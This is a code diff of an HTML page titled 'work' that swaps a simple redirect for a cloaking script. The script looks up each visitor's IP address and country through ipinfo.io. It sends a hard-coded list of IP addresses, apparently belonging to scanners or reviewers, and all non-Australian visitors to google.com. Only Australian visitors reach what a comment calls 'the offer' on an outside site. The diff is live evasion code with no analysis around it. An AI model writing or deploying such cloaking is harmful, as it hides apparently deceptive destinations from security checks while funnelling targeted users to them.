@@ -1,8 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="refresh" content="0; URL='https://www.sehigh.com/DZRZX6W/2DZTNR69/'" />
-  <title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>work</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        // Define the allowed countries (ISO 3166-1 alpha-2 country codes)
+        const allowedCountries = ['AU']; // Only allow Australia (AU)
+
+        // Define blocked IP addresses
+        const blockedIPs = [
+      "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
+      "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
+      "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
+      "104.28.35.3", "104.28.35.4", "68.218.165.136", "173.239.194.229", "68.218.165.140",
+      "52.243.103.225", "48.215.3.146", "149.88.101.20", "217.64.126.150", "104.28.125.4",
+      "154.16.81.84"
+        ];
+
+        $.get('https://ipinfo.io/json', function(data) {  
+            const ipAddress = data.ip;  // Extract the IP address  
+            const country = data.country;  // Extract the country code  
+
+            console.log("IP Address:", ipAddress);  
+            console.log("Country:", country);  
+
+            // Block IP addresses
+            if (blockedIPs.includes(ipAddress)) {
+                console.log("Blocked IP detected:", ipAddress);
+                window.location.replace("https://google.com"); // Redirect immediately without delay
+                return;
+            }
+
+            // Check if the country is allowed
+            if (allowedCountries.includes(country)) {    
+                console.log("Access allowed for country:", country);    
+                window.location.replace("https://www.sehigh.com/DZRZX6W/2DZTNR69/"); // Redirect to the offer for allowed countries
+            } else {    
+                console.log("Access denied for country:", country);    
+                window.location.replace("https://google.com"); // Redirect to Google for other countries
+            }
+        }).fail(function(error) {  
+            console.error('Error:', error);  
+            window.location.replace("https://google.com"); // If there's an error, redirect to Google
+        });
+    </script>
 </head>
 </html>
